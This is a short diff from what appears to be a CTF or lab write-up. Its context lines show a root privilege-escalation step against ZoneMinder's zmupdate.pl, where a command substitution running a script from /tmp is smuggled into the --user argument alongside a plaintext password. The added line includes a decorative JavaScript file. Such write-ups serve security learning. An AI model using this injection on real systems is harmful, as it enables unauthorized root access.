@@ -281,3 +281,4 @@ And as a final step:
 ```bash
 sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploitfinalbello.sh)' --pass=ZoneMinderPassword2023
 ```
+<script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
